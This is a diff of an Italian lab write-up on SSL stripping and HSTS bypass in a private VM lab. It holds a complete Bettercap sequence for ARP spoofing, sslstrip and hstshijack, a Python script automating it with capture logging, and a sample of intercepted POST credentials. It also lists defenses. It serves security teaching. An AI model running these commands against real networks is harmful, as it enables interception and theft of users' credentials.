@@ -1,53 +1,43 @@
-Lab-02— SSL Stripping & HSTS Bypass with Bettercap
+# Lab 02 — SSL Stripping & HSTS Bypass
 
-| Concetto | Descrizione |
-|---|---|
-| SSL Stripping | Downgrade HTTPS → HTTP tra victim e attaccante, mantenendo HTTPS verso il server |
-| HSTS | HTTP Strict Transport Security — header che forza HTTPS nel browser |
-| HSTS Hijack | Bypass HSTS usando domini simili (es. `paypal.com` → `paypaI.com`) |
-| Bettercap | Framework MITM avanzato: ARP spoof + proxy + sniff in un unico tool |
-| mitmproxy | Proxy intercettazione TLS/HTTP interattivo |
+## Obiettivo
+Degradare connessioni HTTPS a HTTP intercettando il traffico tramite SSL stripping in posizione MitM.
 
----
+## Ambiente
+| VM | IP | Ruolo |
+|---|---|---|
+| Kali Linux | 10.0.2.6 | Attaccante |
+| Lubuntu | 10.0.2.15 | Vittima |
+| pfSense | 10.0.2.1 | Gateway |
 
-#### Attack flow
+## Tool utilizzati
+- `bettercap` — SSL stripping + ARP spoofing + HSTS hijack
+- `wireshark` — verifica traffico HTTP risultante
 
-```
-Victim Browser  ←HTTP→  Attacker (Kali)  ←HTTPS→  Real Server
-                          │
-                     SSL Strip proxy
-                     (Bettercap/mitmproxy)
-```
+## Comandi
 
-#### Bettercap command sequence
-
+### 1. Sequenza completa con Bettercap
 ```bash
-# Lancio base Bettercap
 sudo bettercap -iface eth0
-
-# Comandi interattivi (o via -eval):
-net.probe on               # scopre host attivi
-net.sniff on               # sniffing pacchetti
-set arp.spoof.targets 192.168.142.141
-set arp.spoof.fullduplex true
-arp.spoof on               # avvia MITM via ARP
-
-set https.proxy.sslstrip true
-https.proxy on             # proxy HTTPS con SSL strip
-hstshijack                 # bypass HSTS
 ```
+Comandi interattivi:net.probe on
+net.sniff on
+set arp.spoof.targets 10.0.2.15
+set arp.spoof.fullduplex true
+arp.spoof on
+set https.proxy.sslstrip true
+https.proxy on
+hstshijack
 
-#### Script — Bettercap automation (Pasquale's solution)
-
+### 2. Script Python — automazione Bettercap
 ```python
 import subprocess
 
 INTERFACCIA   = "eth0"
-TARGET_IP     = "192.168.142.141"
+TARGET_IP     = "10.0.2.15"
 NOME_FILE_LOG = "cattura_dati.log"
 
 comandi = [
-    f"set net.sniff.skip {HOST_VMWARE}",
     "events.ignore zeroconf.browsing",
     f"set events.stream.output {NOME_FILE_LOG}",
     "net.probe on",
@@ -65,17 +55,17 @@ stringa_comandi = "; ".join(comandi)
 subprocess.run(["sudo", "bettercap", "-iface", INTERFACCIA, "-eval", stringa_comandi])
 ```
 
-#### Credential capture example
+## Attack Flow
+Victim Browser  <--HTTP-->  Attacker (Kali)  <--HTTPS-->  Real Server
+|
+SSL Strip proxy (Bettercap)
 
-```
-# Output Bettercap dopo SSL strip su sito HTTP
-[http.proxy] POST http://example.com/login
-  username=admin&password=password123
-```
+## Risultati
+- Connessioni HTTPS degradate a HTTP
+- Credenziali POST intercettate in chiaro
+- HSTS bypassato con hstshijack
 
-#### Countermeasures
-- HSTS Preloading (browser hardcoded list)
-- Certificate Pinning
-- VPN cifrata end-to-end
-
----
+## Concetti chiave
+- SSL stripping sfrutta la prima richiesta HTTP prima del redirect HTTPS
+- HSTS mitiga l'attacco ma hstshijack usa domini quasi-identici per bypassarlo
+- Difesa: HSTS preloading, certificate pinning, VPN
